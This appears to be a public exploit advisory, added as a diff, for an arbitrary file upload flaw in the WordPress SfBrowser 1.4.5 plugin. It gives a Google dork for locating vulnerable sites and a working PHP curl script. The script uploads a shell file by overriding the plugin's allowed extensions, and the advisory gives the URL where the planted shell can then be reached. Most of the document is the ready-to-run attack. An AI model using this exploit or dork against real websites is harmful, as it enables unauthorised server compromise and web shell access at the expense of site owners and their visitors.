@@ -1,0 +1,36 @@
+###########################################################
+#
+# Exploit Title: Wordpress SfBrowser Version 1.4.5 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/sfbrowser/connectors/php/
+# Date: 11/06/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage:  http://www.sjeiti.com/
+# Software Link: http://downloads.wordpress.org/plugin/sfbrowser.zip
+# Version: 1.4.5
+#
+###########################################################
+
+Vuln page : http://mysite.com/wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php
+
+exploit :
+
+<?php
+$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\shell.ptxt";
+$c = curl_init("http://127.0.0.1/wp/wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('fileToUpload'=>"@$u",
+'a'=>"upload",
+'file'=>"",
+'deny'=>"lam",
+'allow'=>"ptxt|exe|sh",
+'resize'=>array(0,0)));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+shell Access : http://mysite.com/wp-content/plugins/sfbrowser/shell.ptxt
+
+#####################################################################
